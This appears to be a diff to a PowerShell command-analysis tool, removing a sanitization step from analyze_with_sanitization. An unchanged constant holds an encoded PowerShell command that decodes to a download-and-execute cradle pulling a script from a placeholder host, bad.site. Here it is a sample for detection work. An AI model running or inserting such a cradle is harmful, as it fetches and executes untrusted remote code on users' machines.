@@ -13,7 +13,6 @@ from config.settings import CACHE_DURATION
 from services import detectors
 
 
-from services.sanitization import apply_sanitization, get_detected_indicator_names
 
 
 EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'
@@ -500,11 +499,7 @@ def analyze_command_patterns(command: str, signatures: list, allow_decoded_analy
 
 def analyze_with_sanitization(command: str, signatures: list, allow_decoded_analysis: bool = True) -> dict:
     """
-    Analyzes PowerShell command with conditional sanitization.
-
-    First analyzes the raw command, then applies sanitization methods
-    that are triggered by specific indicators. If sanitization reveals
-    new indicators, uses the sanitized version.
+    Analyzes PowerShell command.
 
     Args:
         command: Raw PowerShell command to analyze
@@ -513,36 +508,9 @@ def analyze_with_sanitization(command: str, signatures: list, allow_decoded_anal
                                Used when user has reached decode quota limit.
 
     Returns:
-        dict: Analysis results with sanitization info included
+        dict: Analysis results
     """
-
-    def get_indicators(cmd: str) -> list[str]:
-        result = analyze_command_patterns(cmd, signatures, allow_decoded_analysis)
-        return get_detected_indicator_names(result)
-
- 
-    sanitization_result = apply_sanitization(command, get_indicators)
-
- 
-    if sanitization_result["was_sanitized"]:
-        final_command = sanitization_result["sanitized_command"]
-        analysis_result = analyze_command_patterns(final_command, signatures, allow_decoded_analysis)
-
-        
-        analysis_result["sanitization"] = {
-            "was_sanitized": True,
-            "original_command": command,
-            "applied_methods": sanitization_result["applied_sanitizations"]
-        }
-    else:
-       
-        analysis_result = analyze_command_patterns(command, signatures, allow_decoded_analysis)
-        analysis_result["sanitization"] = {
-            "was_sanitized": False,
-            "original_command": command,
-            "applied_methods": []
-        }
-
+    analysis_result = analyze_command_patterns(command, signatures, allow_decoded_analysis)
     return analysis_result
 
 
